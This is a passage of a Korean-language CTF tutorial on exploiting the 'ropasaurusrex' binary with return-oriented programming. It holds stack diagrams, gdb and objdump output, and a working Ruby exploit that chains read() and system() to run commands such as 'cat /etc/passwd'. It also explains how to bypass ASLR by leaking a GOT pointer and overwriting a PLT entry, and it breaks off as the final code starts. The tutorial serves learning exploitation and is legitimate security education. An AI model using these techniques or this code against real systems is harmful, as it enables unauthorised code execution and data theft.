+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
+</span><span class='line'>|         ...          |
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+ &lt;-- system()의 프레임 시작
+</span><span class='line'>|      void *arg       |
+</span><span class='line'>+----------------------+
+</span><span class='line'>|   [return address]   | &lt;-- 스택 포인터
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+ &lt;-- pop/pop/pop/ret의 프레임
+</span><span class='line'>| [address of system]  |
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+ &lt;-- read()의 프레임 시작
+</span><span class='line'>|     size_t count     |
+</span><span class='line'>+----------------------+
+</span><span class='line'>|      void *buf       |
+</span><span class='line'>+----------------------+
+</span><span class='line'>|        int fd        |
+</span><span class='line'>+----------------------+
+</span><span class='line'>| [address of "pppr"]  |
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+
+</span><span class='line'>|         ...          |
+</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>pop/pop/pop/ret</code>은 <code>objdump</code>를 이용하면 어렵지 않게 찾을 수 있다:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>objdump -d ./ropasaurusrex | egrep <span class="s1">&#39;pop|ret&#39;</span>
+</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
+</span><span class='line'> 80484b5:       5b                      pop    ebx
+</span><span class='line'> 80484b6:       5e                      pop    esi
+</span><span class='line'> 80484b7:       5f                      pop    edi
+</span><span class='line'> 80484b8:       5d                      pop    ebp
+</span><span class='line'> 80484b9:       c3                      ret
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>이건 다음 함수를 실행할 때 1~4개의 인자를 스택에서 지울 수 있게 해준다. 완벽하다!</p>
+
+<p>그리고 이걸 직접 하고 있다면 pop들이 연속한 주소에 있다는 걸 확인해라. 그래서 <code>egrep</code>으로 찾는 것은 약간 위험하다.</p>
+
+<p>이제 우리는 세 개의 <code>pop</code>과 <code>ret</code>이 필요하면 (<code>read()</code>가 사용한 세 개의 인자를 지우기 위해) 주소 <code>0x80484b6</code>을 사용하면 될 것이다. 그러면 스택은 이렇게 될 것이다:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
+</span><span class='line'>|         ...          |
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+ &lt;-- system()의 프레임 시작
+</span><span class='line'>|      void *arg       | - 0x08049530 (buf)
+</span><span class='line'>+----------------------+
+</span><span class='line'>|   [return address]   | - 0x44444444
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+
+</span><span class='line'>| [address of system]  | - 0xb7ec2450
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+ &lt;-- read()의 프레임 시작
+</span><span class='line'>|     size_t count     | - strlen(cmd)
+</span><span class='line'>+----------------------+
+</span><span class='line'>|      void *buf       | - 0x08049530 (buf)
+</span><span class='line'>+----------------------+
+</span><span class='line'>|        int fd        | - 0 (stdin)
+</span><span class='line'>+----------------------+
+</span><span class='line'>| [address of "pppr"]  | - 0x080484b6
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+
+</span><span class='line'>|         ...          |
+</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>원격 서버에서 보내는 걸 받기 위해 <code>s.read()</code>를 익스플로잇 마지막에 추가하자. 현재 익스플로잇은 다음과 같다:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span> <span class="mi">4444</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># The command we&#39;ll run</span>
+</span><span class='line'><span class="n">cmd</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># From objdump -x</span>
+</span><span class='line'><span class="n">buf</span> <span class="o">=</span> <span class="mh">0x08049530</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># From objdump -D ./ropasaurusrex | grep read</span>
+</span><span class='line'><span class="n">read_addr</span> <span class="o">=</span> <span class="mh">0x0804832C</span>
+</span><span class='line'><span class="c1"># From objdump -D ./ropasaurusrex | grep write</span>
+</span><span class='line'><span class="n">write_addr</span> <span class="o">=</span> <span class="mh">0x0804830C</span>
+</span><span class='line'><span class="c1"># From gdb, &quot;x/x system&quot;</span>
+</span><span class='line'><span class="n">system_addr</span> <span class="o">=</span> <span class="mh">0xb7ec2450</span>
+</span><span class='line'><span class="c1"># From objdump, &quot;pop/pop/pop/ret&quot;</span>
+</span><span class='line'><span class="n">pppr_addr</span> <span class="o">=</span> <span class="mh">0x080484b6</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># Generate the payload</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">140</span> <span class="o">+</span>
+</span><span class='line'>  <span class="o">[</span>
+</span><span class='line'>    <span class="c1"># system()&#39;s stack frame</span>
+</span><span class='line'>    <span class="n">buf</span><span class="p">,</span>         <span class="c1"># writable memory (cmd buf)</span>
+</span><span class='line'>    <span class="mh">0x44444444</span><span class="p">,</span>  <span class="c1"># system()&#39;s return address</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c1"># pop/pop/pop/ret&#39;s stack frame</span>
+</span><span class='line'>    <span class="n">system_addr</span><span class="p">,</span> <span class="c1"># pop/pop/pop/ret&#39;s return address</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c1"># read()&#39;s stack frame</span>
+</span><span class='line'>    <span class="n">cmd</span><span class="o">.</span><span class="n">length</span><span class="p">,</span>  <span class="c1"># number of bytes</span>
+</span><span class='line'>    <span class="n">buf</span><span class="p">,</span>         <span class="c1"># writable memory (cmd buf)</span>
+</span><span class='line'>    <span class="mi">0</span><span class="p">,</span>           <span class="c1"># stdin</span>
+</span><span class='line'>    <span class="n">pppr_addr</span><span class="p">,</span>   <span class="c1"># read()&#39;s return address</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">read_addr</span> <span class="c1"># Overwrite the original return</span>
+</span><span class='line'>  <span class="o">].</span><span class="n">reverse</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;I*&quot;</span><span class="p">)</span> <span class="c1"># Convert a series of &#39;ints&#39; to a string</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># Write the &#39;exploit&#39; payload</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># When our payload calls read() the first time, this is read</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># Read the response from the command and print it to the screen</span>
+</span><span class='line'><span class="nb">puts</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">read</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># Clean up</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>그리고 실행하게 되면, 예상대로 나온다:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;cat /etc/passwd&quot;</span>
+</span><span class='line'>root:x:0:0:root:/root:/bin/bash
+</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
+</span><span class='line'>...
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>그리고 <a href="https://en.wikipedia.org/wiki/Core_dump">코어 덤프</a>를 보면, 예상한 대로 <code>0x44444444</code>에서 크래시를 일으킨다.</p>
+
+<p>끝났다, 그렇지?</p>
+
+<p>실은 틀렸다!</p>
+
+<p>이 익스플로잇은 내 테스트 기기에서 완벽하게 작동하지만, ASLR이 적용되었다면 실패한다:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>sudo sysctl -w kernel.randomize_va_space<span class="o">=</span>1
+</span><span class='line'>kernel.randomize_va_space <span class="o">=</span> 1
+</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;cat /etc/passwd&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>여기서부터 조금 더 복잡해진다. 가보자!</p>
+
+<h2>ASLR이 뭐야?</h2>
+
+<p>ASLR&mdash;주소 공간 레이아웃 불규칙화(address space layout randomization)&mdash;은 현대 시스템(FreeBSD는 제외)에 구현된 방어 기법으로, 라이브러리가 로드 되는 주소를 불규칙화 한다. 그 예로, ropasaurusrex를 두 번 실행하고 <code>system()</code>의 주소를 알아내 보자:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s1">&#39;printf &quot;A&quot;x1000&#39;</span> | ./ropasaurusrex
+</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
+</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>gdb ./ropasaurusrex core
+</span><span class='line'>Program terminated with signal 11, Segmentation fault.
+</span><span class='line'><span class="c">#0  0x41414141 in ?? ()</span>
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x system
+</span><span class='line'>0xb766e450 &lt;system&gt;:    0x890cec83
+</span><span class='line'>
+</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s1">&#39;printf &quot;A&quot;x1000&#39;</span> | ./ropasaurusrex
+</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
+</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>gdb ./ropasaurusrex core
+</span><span class='line'>Program terminated with signal 11, Segmentation fault.
+</span><span class='line'><span class="c">#0  0x41414141 in ?? ()</span>
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x system
+</span><span class='line'>0xb76a7450 &lt;system&gt;:    0x890cec83
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>system()</code>의 주소가 <code>0xb766e450</code>에서 <code>0xb76a7450</code>으로 바뀐 것을 보라. 이게 문제다!</p>
+
+<h2>ASLR 정복</h2>
+
+<p>그래서, 뭘 해야 할까? 사실, 바이너리 자체는 ASLR이 적용되지 않아서, 거기 있는 모든 주소는 유용하게도 그대로 머물러 있다고 믿을 수 있다. 아주 중요하게도, 재배치(relocation) 테이블은 같은 주소에 남아있다:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>objdump -R ./ropasaurusrex
+</span><span class='line'>
+</span><span class='line'>./ropasaurusrex:     file format elf32-i386
+</span><span class='line'>
+</span><span class='line'>DYNAMIC RELOCATION RECORDS
+</span><span class='line'>OFFSET   TYPE              VALUE
+</span><span class='line'>08049600 R_386_GLOB_DAT    __gmon_start__
+</span><span class='line'>08049610 R_386_JUMP_SLOT   __gmon_start__
+</span><span class='line'>08049614 R_386_JUMP_SLOT   write
+</span><span class='line'>08049618 R_386_JUMP_SLOT   __libc_start_main
+</span><span class='line'>0804961c R_386_JUMP_SLOT   <span class="nb">read</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>이렇게 <code>read()</code>와 <code>write()</code>의 주소&mdash;바이너리 안에 있는&mdash;를 알게 되었다. 이게 뭘 의미하느냐? 바이너리가 실행 중일 때 이들의 값을 살펴보자:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>gdb ./ropasaurusrex
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> run
+</span><span class='line'>^C
+</span><span class='line'>Program received signal SIGINT, Interrupt.
+</span><span class='line'>0xb7fe2424 in __kernel_vsyscall <span class="o">()</span>
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x 0x0804961c
+</span><span class='line'>0x804961c:      0xb7f48110
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> print <span class="nb">read</span>
+</span><span class='line'><span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xb7f48110 &lt;<span class="nb">read</span>&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>보라.. <code>read()</code>를 가리키는 포인터가 우리가 알고 있는 메모리 주소에 있다! 이걸로 뭘 할지 궁금한가&hellip;? 힌트를 하나 주겠다: 우리는 <code>write()</code> 함수&mdash;주소를 아는 또 하나의 함수&mdash;를 사용해 임의의 메모리에서 데이터를 가져와 소켓에 쓸 수 있다.</p>
+
+<h2>드디어, 코드 실행!</h2>
+
+<p>좋다, 잠깐 멈추고, 단계를 나누자. 우리는 이와 같은 과정이 필요하다:</p>
+
+<ol>
+<li><code>read()</code> 함수를 이용해 명령어를 메모리에 복사</li>
+<li><code>write()</code> 함수를 이용해 <code>write()</code> 함수의 주소 구하기</li>
+<li><code>system()</code> 주소를 구하기 위해 <code>write()</code>과 <code>system()</code>의 오프셋 계산</li>
+<li><code>system()</code> 호출</li>
+</ol>
+
+
+<p><code>system()</code>을 호출하려면, <code>system()</code>의 주소를 메모리 어딘가에 쓰고, 그걸 호출해야 한다. 가장 쉬운 방법은 <code>.plt</code> 테이블의 <code>read()</code> 호출을 덮어쓰고 <code>read()</code>를 호출하는 것이다.</p>
+
+<p>지금 아마도 조금 혼란스러울 것이다. 하지만 나도 그랬으니 걱정하지 마라. 난 이게 된다는 사실에 충격받았다. :)</p>
+
+<p>잠시 멈추고 이걸 이해해 보자! 이건 우리가 원하는 스택 프레임일 것이다:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
+</span><span class='line'>|         ...          |
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+ &lt;-- system()의 프레임 [7]
+</span><span class='line'>|      void *arg       |
+</span><span class='line'>+----------------------+
+</span><span class='line'>|   [return address]   |
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+ &lt;-- pop/pop/pop/ret의 프레임 [6]
+</span><span class='line'>|  [address of read]   | - 사실은 system()으로 점프할 것이다.
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+ &lt;-- 두 번째 read()의 프레임 [5]
+</span><span class='line'>|     size_t count     | - 4바이트 (32비트 주소의 크기)
+</span><span class='line'>+----------------------+
+</span><span class='line'>|      void *buf       | - read()를 가리키는 덮어쓸 수 있는 포인터
+</span><span class='line'>+----------------------+
+</span><span class='line'>|        int fd        | - 0 (stdin)
+</span><span class='line'>+----------------------+
+</span><span class='line'>| [address of "pppr"]  |
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+ &lt;-- pop/pop/pop/ret의 프레임 [4]
+</span><span class='line'>|  [address of read]   |
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+ &lt;-- write()의 프레임 [3]
+</span><span class='line'>|     size_t count     | - 4바이트 (32비트 주소의 크기)
+</span><span class='line'>+----------------------+
+</span><span class='line'>|      void *buf       | - read()를 가리키는 포인터를 포함하는 주소
+</span><span class='line'>+----------------------+
+</span><span class='line'>|        int fd        | - 1 (stdout)
+</span><span class='line'>+----------------------+
+</span><span class='line'>| [address of "pppr"]  |
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+ &lt;-- pop/pop/pop/ret의 프레임 [2]
+</span><span class='line'>|  [address of write]  |
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+ &lt;-- read()의 프레임 [1]
+</span><span class='line'>|     size_t count     | - strlen(cmd)
+</span><span class='line'>+----------------------+
+</span><span class='line'>|      void *buf       | - 쓸 수 있는 메모리
+</span><span class='line'>+----------------------+
+</span><span class='line'>|        int fd        | - 0 (stdin)
+</span><span class='line'>+----------------------+
+</span><span class='line'>| [address of "pppr"]  |
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+
+</span><span class='line'>|         ...          |
+</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>오 이런, 이게 대체 뭐야?</p>
+
+<p>바닥에서 시작해서 올라가자! 말하기 쉽게 각 프레임에 숫자를 붙였다.</p>
+
+<p>프레임 [1]은 전에 본 것이다. <code>cmd</code>를 쓸 수 있는 메모리에 기록한다. 프레임 [2]는 <code>read()</code>를 정리할 표준적인 <code>pop/pop/pop/ret</code>을 사용한다.</p>
+
+<p>프레임 [3]은 <code>write()</code>를 사용해 소켓에 <code>read()</code> 주소를 쓴다. 프레임 [4]는 <code>write()</code> 후 정리할 표준적인 <code>pop/pop/pop/ret</code>을 사용한다.</p>
+
+<p>프레임 [5]는 소켓을 통해 다른 주소를 읽고 그걸 메모리에 쓴다. 이 주소는 <code>system()</code> 호출 주소가 될 것이다. 이걸 메모리에 쓰는 게 작동하는 이유는 <code>read()</code>가 호출되는 방식 때문이다. 우리가 gdb (<code>0x0804832C</code>)에서 써 왔던 <code>read()</code> 호출 부분을 보면 이렇다:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/i 0x0804832C
+</span><span class='line'>0x804832c &lt;<span class="nb">read</span>@plt&gt;:   jmp    DWORD PTR ds:0x804961c
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>read()</code>는 사실 간접적인 점프로 구현되어 있다! 그러니 <code>ds:0x804961c</code>의 값이 무엇이든 이걸 바꿔도 그리로 점프하게 되고, 결국 우린 어디로든 점프할 수 있게 된다! 그래서 프레임 [3]에서 메모리로부터 주소를 읽고 (<code>read()</code>의 실제 주소를 얻기 위해) 프레임 [5]에서 그 주소에 새 주소를 쓰는 것이다.</p>
+
+<p>프레임 [6]은 표준적인 <code>pop/pop/pop/ret</code> 구조지만 약간 다르다: <code>pop/pop/pop/ret</code>의 반환 주소가 실제론 <code>read()</code>의 <code>.plt</code> 엔트리인 <code>0x804832c</code>다. <code>read()</code>의 <code>.plt</code> 엔트리를 <code>system()</code>으로 덮어쓰기 때문에, 이 호출은 실제로 <code>system()</code>으로 가게 된다!</p>
+
+<h2>최종 코드</h2>
+
+<p>휴! 꽤 복잡했다. DEP와 ASLR을 모두 우회하며 ropasaurusrex의 익스플로잇을 모두 구현한 코드다:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
+</span><span class='line'>
